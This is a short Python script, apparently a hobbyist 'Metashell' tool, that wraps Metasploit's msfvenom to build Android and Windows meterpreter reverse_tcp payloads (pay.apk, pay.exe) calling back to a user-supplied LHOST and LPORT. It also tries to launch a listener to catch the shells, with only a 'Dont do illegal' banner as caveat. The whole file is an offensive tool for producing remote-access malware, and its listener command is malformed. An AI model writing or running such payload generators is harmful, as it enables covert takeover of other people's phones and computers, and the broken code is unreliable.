import os
import time
import colorama
from colorama import Fore
os.system("clear")
def ct(tup):
    str = ''.join(tup)
    return str
def main():
  user = input("platform A/W or options M/E: ")
  if (user == "a"):
    lhost = input("lhost=")
    lport = input("lport=")
    cmd = ("msfvenom -p android/meterpreter/reverse_tcp LHOST=",lhost," LPORT=",lport," -o pay.apk")
    str = ct(cmd)
    os.system(str)
    os.system("sheller")
  if (user == "w"):
    lhost = input("lhost=")
    lport = input("lport=")
    cmd = ("msfvenom -p windows/meterpreter/reverse_tcp LHOST=",lhost," LPORT=",lport," -o pay.exe")
    str = ct(cmd)
    os.system(str)
    os.system("sheller")
  if (user == "m"):
    lhost = input("lhost=")
    lport = input("lport=")
    cmd = ("msfconsole && use multi/exploit && payload = windows/meterpreter/reverse_tcp && LHOST=",lhost," && LPORT=",lport)
    str = ct(cmd)
    os.system(str)
  if(user == "e"):
    exit()
  
print(Fore.RED + '''
   _____          __                .__           .__  .__   
  /     \   _____/  |______    _____|  |__   ____ |  | |  |  
 /  \ /  \_/ __ \   __\__  \  /  ___/  |  \_/ __ \|  | |  |  
/    Y    \  ___/|  |  / __ \_\___ \|   Y  \  ___/|  |_|  |__
\____|__  /\___  >__| (____  /____  >___|  /\___  >____/____/
        \/     \/          \/     \/     \/     \/           V0.1
Made by puttyX
-------------------
|                 |
| Dont do illegal |
|                 |
-------------------
''')
while 0 < 1:
  main()